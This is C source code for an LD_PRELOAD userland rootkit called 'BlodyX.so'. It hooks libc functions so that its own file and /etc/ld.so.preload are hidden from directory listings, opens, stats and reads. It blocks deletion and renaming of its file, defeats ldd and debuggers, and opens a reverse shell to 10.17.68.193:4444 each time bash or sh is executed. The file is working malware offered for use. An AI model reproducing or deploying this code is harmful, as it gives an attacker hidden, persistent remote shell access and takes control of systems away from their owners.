#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <errno.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <stdarg.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ptrace.h>
#include <dirent.h>

#define ANTI_DEBUG_MSG "Yooo shut up lady it's sunday ....so get lost from here\n"
#define SEXY "BlodyX.so"

// function pointers for hooking
static int (*o_execve)(const char *, char *const[], char *const[]);
static int (*o_open)(const char *, int, ...);
static int (*o_openat)(int, const char *, int, ...);
static FILE *(*o_fopen)(const char *, const char *);
static FILE *(*o_fopen64)(const char *, const char *);
static int (*o_stat)(const char *, struct stat *);
static int (*o_lstat)(const char *, struct stat *);
static int (*o_access)(const char *, int);
static ssize_t (*o_read)(int, void *, size_t);
static long (*o_ptrace)(int, pid_t, void *, void *) = NULL;
static int (*orig_unlink)(const char *);
static int (*orig_unlinkat)(int, const char *, int);
static int (*orig_rename)(const char *, const char *);
static int (*orig_renameat)(int, const char *, int, const char *);
const char *FILENAME = "/etc/ld.so.preload"; 

struct dirent* (*original_readdir)(DIR *) = NULL;

struct dirent *readdir(DIR *dirp) { 
    if (original_readdir == NULL)
        original_readdir = (struct dirent* (*)(DIR *)) dlsym(RTLD_NEXT, "readdir");
    
    struct dirent *ep = original_readdir(dirp);
    while (ep != NULL && !strncmp(ep->d_name, SEXY, strlen(SEXY)))
        ep = original_readdir(dirp);
    
    return ep;
}

void anti_debug_exit() {
    const char *anti_debug_msg = ANTI_DEBUG_MSG;
    write(STDERR_FILENO, anti_debug_msg, strlen(anti_debug_msg));
    exit(-1);
}

long lol_ptrace(int request, pid_t pid, void *addr, void *data) {
    if (!o_ptrace) {
        o_ptrace = dlsym(RTLD_NEXT, "ptrace");
    }

    if (request == PTRACE_TRACEME || request == PTRACE_ATTACH) {
        anti_debug_exit();
    }

    return o_ptrace(request, pid, addr, data);
}

void mf_shell() {
    int sockfd;
    struct sockaddr_in srv;

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return; 

    srv.sin_family = AF_INET;
    srv.sin_port = htons(4444);  
    srv.sin_addr.s_addr = inet_addr("10.17.68.193"); // you can change it to your friends' IP
    if (connect(sockfd, (struct sockaddr *)&srv, sizeof(srv)) == 0) {
        dup2(sockfd, 0);  
        dup2(sockfd, 1);  
        dup2(sockfd, 2);  
        execl("/bin/sh", "sh", "-i", NULL); 
    }

    close(sockfd);
}

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    if (!o_execve)
        o_execve = dlsym(RTLD_NEXT, "execve");

    if (strstr(pathname, "/bin/bash") || strstr(pathname, "/bin/sh")) {
        mf_shell(); 
    }

    if (strstr(pathname, "ldd") || strstr(pathname, "ld-linux")) {
        errno = ECONNRESET;
        return -1;
    }

    return o_execve(pathname, argv, envp);
}

int open(const char *pathname, int flags, ...) {
    if (!o_open)
        o_open = dlsym(RTLD_NEXT, "open");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    int mode = va_arg(args, int);
    va_end(args);

    return o_open(pathname, flags, mode);
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    if (!o_openat)
        o_openat = dlsym(RTLD_NEXT, "openat");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return -1;
    }

    va_list args;
    va_start(args, flags);
    int mode = va_arg(args, int);
    va_end(args);

    return o_openat(dirfd, pathname, flags, mode);
}

FILE *fopen(const char *pathname, const char *mode) {
    if (!o_fopen)
        o_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return NULL;
    }

    return o_fopen(pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode) {
    if (!o_fopen64)
        o_fopen64 = dlsym(RTLD_NEXT, "fopen64");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return NULL;
    }

    return o_fopen64(pathname, mode);
}

int stat(const char *pathname, struct stat *buf) {
    if (!o_stat)
        o_stat = dlsym(RTLD_NEXT, "stat");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return -1;
    }

    return o_stat(pathname, buf);
}

int lstat(const char *pathname, struct stat *buf) {
    if (!o_lstat)
        o_lstat = dlsym(RTLD_NEXT, "lstat");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return -1;
    }

    return o_lstat(pathname, buf);
}

int access(const char *pathname, int mode) {
    if (!o_access)
        o_access = dlsym(RTLD_NEXT, "access");

    if (strstr(pathname, FILENAME)) {
        errno = ENOENT;
        return -1;
    }

    return o_access(pathname, mode);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!o_read)
        o_read = dlsym(RTLD_NEXT, "read");

    char path[256];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

    char realpath_buf[256];
    if (readlink(path, realpath_buf, sizeof(realpath_buf) - 1) != -1) {
        realpath_buf[sizeof(realpath_buf) - 1] = '\0';
        if (strstr(realpath_buf, FILENAME)) {
            errno = ENOENT;
            return -1;
        }
    }

    return o_read(fd, buf, count);
}

int unlink(const char *pathname ){
    if(!orig_unlink){
        orig_unlink = dlsym(RTLD_NEXT, "unlink");
    }
    if(strstr(pathname, SEXY)){
        errno = ENOENT;
        return -1;
    }
    return orig_unlink(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags){
    if(!orig_unlinkat){
        orig_unlinkat = dlsym(RTLD_NEXT,"unlinkat");
    }
    if(strstr(pathname, SEXY)){
        errno = ENOENT;
        return -1;
    }
    return orig_unlinkat(dirfd, pathname, flags);
}

int rename(const char *oldpath, const char *newpath) {
    if (strstr(oldpath, SEXY) || strstr(newpath, SEXY)) {
        errno = ENOENT;
        return -1;
    }

    return orig_rename(oldpath, newpath);
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath){
   if (strstr(oldpath, SEXY) || strstr(newpath, SEXY)) {
    errno = ENOENT;
    return -1;
   }

    return orig_renameat(olddirfd, oldpath, newdirfd, newpath);
}
